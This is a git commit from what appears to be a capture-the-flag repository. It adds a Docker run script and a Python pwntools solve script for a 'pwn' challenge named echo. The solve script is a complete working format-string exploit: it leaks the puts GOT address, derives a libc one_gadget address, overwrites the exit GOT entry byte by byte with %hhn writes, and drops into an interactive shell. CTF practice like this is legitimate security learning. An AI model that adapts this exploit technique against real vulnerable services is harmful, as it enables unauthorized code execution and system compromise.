4bfb6983a25c350475177376ef18e1a5a5b200b8
3553x <3553x@tuta.io>
2018-03-27 14:51:30 +0100

    implemented plt printf closes #19

---
+++ pwn/echo/run.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+docker run -d -p 3338:3338 -m1g --name echo_live echo
---
+++ pwn/echo/solve.py
@@ -0,0 +1,73 @@
+#!/usr/bin/python2
+
+from pwn import *
+
+context.binary = "./echo"
+
+binary = ELF("./echo")
+libc = ELF("./libc.so.6")
+
+#obtained using one_gadget
+T_OFF = 0x3f306
+
+s = remote("localhost", 3338)
+#s = process("./echo")
+
+def write_addr(offset, addr):
+    padding = "A" * offset * 8
+    addr = p64(addr)
+
+    writes = []
+
+    indeces = [i for i, x in enumerate(addr) if x == '\0'][::-1]
+
+    addr = addr.replace('\0', 'A')
+    writes.append(padding + addr)
+
+    for x in indeces:
+        writes.append(padding + addr[:x])
+
+    return writes
+
+
+def s_payload(payload):
+    log.info("payload %s" % repr(payload))
+    s.send(payload)
+    return s.recv(timeout=1)
+
+print s.recvline()
+print s.recvline()
+
+PUTS_GOT = b""
+
+log.info("got expected at %x" % binary.got['puts'])
+
+while len(PUTS_GOT) < 8:
+    for x in write_addr(30, binary.got['puts'] + len(PUTS_GOT)):
+        log.info("return %s" % s_payload(x))
+    PUTS_GOT += s_payload(b"%40$s")[:8]
+    if(len(PUTS_GOT) < 8):
+        PUTS_GOT += '\0'
+
+
+log.info("PUTS_GOT = %s" % (PUTS_GOT))
+assert len(PUTS_GOT) == 8
+PUTS_GOT = u64(PUTS_GOT)
+
+
+diff = T_OFF - libc.symbols['puts']
+T_ADDR = PUTS_GOT + diff
+log.info("T_ADDR = %x" % (T_ADDR))
+
+for i, x in enumerate(p64(T_ADDR)):
+    for y in write_addr(30, binary.got['exit'] + i):
+        s_payload(y)        
+    if(x != '\0'):
+        payload = "%" + str(ord(x)) + "c"
+    else:
+        payload = ""
+    ret = s_payload(payload + "%40$hhn")
+    print("sent %x bytes" % len(ret))
+
+s.send("q")
+s.interactive()
